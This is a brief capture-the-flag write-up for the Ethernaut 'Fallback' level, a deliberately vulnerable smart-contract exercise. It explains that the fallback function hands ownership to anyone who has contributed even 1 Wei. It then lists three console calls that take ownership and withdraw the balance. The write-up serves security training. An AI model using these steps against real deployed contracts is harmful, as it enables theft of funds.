# Level1 - Fallback

- [link to challenge](https://ethernaut.zeppelin.solutions/level/0x234094aac85628444a82dae0396c680974260be7)

# Issue

- The default function lets anyone who has contributed become owner as long as they've contributed at least 1 Wei.

# Solution

```
(await contract.contribute({ value: 1}))
(await contract.sendTransaction({ value: 1 }))
(await contract.withdraw())
```
